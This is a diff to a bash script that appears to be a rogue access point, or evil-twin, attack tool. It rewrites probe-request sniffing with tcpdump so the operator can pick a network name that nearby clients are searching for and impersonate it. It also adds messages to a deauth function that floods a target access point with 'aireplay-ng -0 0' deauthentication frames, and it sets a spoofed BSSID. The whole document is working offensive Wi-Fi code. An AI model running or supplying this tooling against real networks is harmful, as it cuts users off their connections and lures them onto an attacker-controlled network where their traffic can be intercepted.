@@ -265,82 +265,59 @@ selectNetwork() {
 }
 
 sniffProbeRequests() {
-	request=0
-	while [ $request -eq 0 ]
-	do
-		read -p "Seconds to scann for probe requests [default is 30]> " t
+        trap "stop=1; pkill tcpdump" SIGINT
 
-		rm $tempFolder/temporal* 2>/dev/null
+        tcpdump -l -e -i $interface type mgt subtype probe-req>$tempFolder/tcpdump.log 2>/dev/null &
 
-	        screen -d -m airodump-ng -w $tempFolder/temporal --output-format netxml $interface>/dev/null &
+        echo
+        echo "PROBE REQUESTS [^C to stop]"
+        stop=0
+        requests=0
+        numProbes=1
+        while [ $stop -ne 1 ]
+        do
+                num=$(wc -l $tempFolder/tcpdump.log | cut -d " " -f 1)
+                while [ $requests -lt $num ]
+                do
+                        requests=$(( $requests + 1 ))
 
-		if [ -z $t ]
-		then
-	        	t=30
-		fi
+                        clientProv=$(grep -oE "([0-9a-f]{2}:){5}[0-9a-f]{2}" $tempFolder/tcpdump.log | sed -n "$requests"p)
+                        apProv=$(cut -d "(" -f 3 $tempFolder/tcpdump.log | cut -d ")" -f 1 | sed -n "$requests"p)
 
-		echo
-		echo "[-] Scanning for probe requests ($t seconds)..."
-		echo
-	        sleep $t
-	        pkill airodump-ng
+                        if [ $apProv ]
+                        then
+                                i=1
+                                found=0
+                                while [ $i -lt $numProbes ]
+                                do
+                                        if [ "$apProv" == "${ap[$i]}" ]
+                                        then
+                                                found=1
+                                        fi
+                                        i=$(( $i + 1))
+                                done
 
-		# If this is omited, parsing will fail. Probably due to the hardware limitations of the raspberry PI
-		sleep 6
+                                if [ $found -eq 0 ]
+                                then
+                                        client[$numProbes]=$clientProv
+                                        ap[$numProbes]=$apProv
 
-		num=$(grep "<wireless-network"  $tempFolder/temporal-01.kismet.netxml | wc -l)
-		begLines=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
-		endLines=$(grep -n "</wireless-network>" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
+                                        echo "[$numProbes] ${client[$numProbes]} -> ${ap[$numProbes]}"
 
-		i=1
-		apNum=1
-		while [ $i -le $num ]
-		do
-		        beg=$(echo $begLines | cut -d " " -f $i)
-		        end=$(echo $endLines | cut -d " " -f $i)
-		        isProbe=$(grep "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d "=" -f 3 | cut -d "\"" -f 2 | sed -n "$i"p)
+                                        numProbes=$(( $numProbes + 1 ))
+                                fi
+                        fi
+                done
+                sleep 1
+        done
 
-		        if [ "$isProbe" == "probe" ]
-		        then
-		                tClientBSSID[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep BSSID -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
-		                tManufacturer[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep manuf -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1 )
-		                tSSID[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep ssid | cut -d ">" -f 2 | cut -d "<" -f 1)
-		                tchannel[$apNum]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep channel -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
+        # Restore SIGINT
+        trap exit SIGINT
 
-		                if [ -z "${tSSID[$apNum]}" ]
-		                then
-		                        tSSID[$apNum]="Unknown"
-		                fi
+        echo
+        read -p "Select probe request > " op
 
-		                if [ -z "${tManufacturer[$apNum]}" ]
-		                then
-		                        tManufacturer[$apNum]="Unknown"
-		                fi
-
-		                apNum=$(( $apNum + 1 ))
-		        fi
-		        i=$(( $i + 1 ))
-		done
-
-		echo
-		echo "PROBE REQUESTS"
-		echo "Network interface: $interface"
-		echo "+----+---------------------+-------------------+"
-		echo "|  i |  AP SSID            |CLIENT MANUFACTURER|"
-		echo "+----+---------------------+-------------------+"
-		i=1
-		while [ $i -lt $apNum ]
-		do
-		        printf  '%1s %2s %1s %-19.19s %1s %17.17s %1s\n'  "|" "$i" "|" "${tSSID[$i]}" "|" "${tManufacturer[$i]}" "|"
-		        i=$(( $i + 1 ))
-		done
-		echo "+----+--------------------+--------------------+"
-		echo
-		read -p "Select probe request to respond to [0 to repeat scann]> " request
-	done
-
-	essid=${tSSID[$request]}
-        channel=${tchannel[$request]}
+        essid=${ap[$op]}
 }
 
 selectEncryption(){
@@ -366,8 +343,11 @@ selectEncryption(){
 }
 
 deauth(){
+	echo "[-] Setting $3 to channel $2"
 	iwconfig "$3" channel "$2"
+	echo "[+] $3 successfully set to channel $2"
         sleep 3
+	echo "[+] Starting to deauth"
         aireplay-ng -0 0 -a "$1" "$3" >/dev/null &
 }
 
@@ -428,6 +408,8 @@ do
 		3)
 			deauth=0
 			sniffProbeRequests
+			read -p "Channel > " channel
+			echo
 			selectEncryption
 			# random bssid
 			bssid=00:09:5a:c9:01:b2
